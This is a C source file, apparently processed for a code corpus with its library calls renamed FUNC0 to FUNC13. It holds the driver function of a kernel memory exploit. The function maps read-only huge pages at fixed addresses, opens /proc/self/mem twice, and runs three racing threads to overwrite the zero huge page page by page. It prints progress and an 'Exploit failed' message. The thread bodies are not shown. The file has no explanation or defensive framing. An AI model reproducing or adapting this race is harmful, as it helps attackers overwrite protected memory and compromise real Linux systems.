#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct thread_args {void* thp_map; void* thp_chk_map; scalar_t__ mem_fd1; scalar_t__ mem_fd2; int off; int /*<<< orphan*/  buf_to_write; scalar_t__ stop; } ;
typedef  int /*<<< orphan*/  pthread_t ;
typedef  int /*<<< orphan*/  pthread_proc ;

/* Variables and functions */
 int /*<<< orphan*/  MADV_HUGEPAGE ; 
 int MAP_ANONYMOUS ; 
 void* MAP_BASE ; 
 void* MAP_FAILED ; 
 int MAP_PRIVATE ; 
 int MAP_SIZE ; 
 int /*<<< orphan*/  MEMESET_VAL ; 
 int /*<<< orphan*/  O_RDWR ; 
 scalar_t__ PAGE_SIZE ; 
 int /*<<< orphan*/  PROT_READ ; 
 int /*<<< orphan*/  FUNC0 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int FUNC3 (void*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,scalar_t__) ; 
 void* FUNC6 (void*,int,int /*<<< orphan*/ ,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (void*,int) ; 
 void* FUNC8 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int FUNC11 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,struct thread_args*) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ unmap_and_read_thread ; 
 scalar_t__ wait_for_success ; 
 scalar_t__ write_thread ; 

int FUNC13() {
    struct thread_args args;
    void *thp_chk_map_addr;
    int ret;

    // Mapping base should be a multiple of the THP size, so we can work with the whole huge page.
    args.thp_map = FUNC6(MAP_BASE, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (args.thp_map == MAP_FAILED) {
        FUNC9("[!] mmap()");
        return -1;
    }
    if (args.thp_map != MAP_BASE) {
        FUNC1(stderr, "[!] Didn't get desired base address for the vulnerable mapping.\n");
        goto err_unmap1;
    }
    
    FUNC10("[*] The beginning of the zero huge page: %lx\n", *(unsigned long *)args.thp_map);

    thp_chk_map_addr = (char *)MAP_BASE + (MAP_SIZE * 2); // MAP_SIZE * 2 to avoid merge
    args.thp_chk_map = FUNC6(thp_chk_map_addr, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    if (args.thp_chk_map == MAP_FAILED) {
        FUNC9("[!] mmap()");
        goto err_unmap1;
    }
    if (args.thp_chk_map != thp_chk_map_addr) {
        FUNC1(stderr, "[!] Didn't get desired base address for the check mapping.\n");
        goto err_unmap2;
    }
    
    ret = FUNC3(args.thp_map, MAP_SIZE, MADV_HUGEPAGE); 
    ret |= FUNC3(args.thp_chk_map, MAP_SIZE, MADV_HUGEPAGE);
    if (ret) {
        FUNC9("[!] madvise()");
        goto err_unmap2;
    }

    args.buf_to_write = FUNC4(PAGE_SIZE);
    if (!args.buf_to_write) {
        FUNC9("[!] malloc()");
        goto err_unmap2;
    }
    FUNC5(args.buf_to_write, MEMESET_VAL, PAGE_SIZE);
    
    args.mem_fd1 = FUNC8("/proc/self/mem", O_RDWR);
    if (args.mem_fd1 < 0) {
        FUNC9("[!] open()");
        goto err_free;
    }
    
    args.mem_fd2 = FUNC8("/proc/self/mem", O_RDWR);
    if (args.mem_fd2 < 0) {
        FUNC9("[!] open()");
        goto err_close1;
    }

    FUNC10("[*] Racing. Gonna take a while...\n");
    args.off = 0;

    // Overwrite every single page
    while (args.off < MAP_SIZE) {   
        pthread_t threads[3]; 
        args.stop = 0;
        
        ret = FUNC11(&threads[0], NULL, (pthread_proc)wait_for_success, &args);
        ret |= FUNC11(&threads[1], NULL, (pthread_proc)unmap_and_read_thread, &args);
        ret |= FUNC11(&threads[2], NULL, (pthread_proc)write_thread, &args);
        
        if (ret) {
            FUNC9("[!] pthread_create()");
            goto err_close2;
        }
        
        FUNC12(threads[0], NULL); // This call will return only after the overwriting is done
        FUNC12(threads[1], NULL);
        FUNC12(threads[2], NULL);

        args.off += PAGE_SIZE;    
        FUNC10("[*] Done 0x%lx bytes\n", args.off);
    }
    
    FUNC10("[*] Success!\n");
    
err_close2:
    FUNC0(args.mem_fd2);
err_close1:
    FUNC0(args.mem_fd1);
err_free:
    FUNC2(args.buf_to_write);
err_unmap2:
    FUNC7(args.thp_chk_map, MAP_SIZE);
err_unmap1:
    FUNC7(args.thp_map, MAP_SIZE);
    
    if (ret) {
        FUNC1(stderr, "[!] Exploit failed.\n");
    }
    
    return ret;
}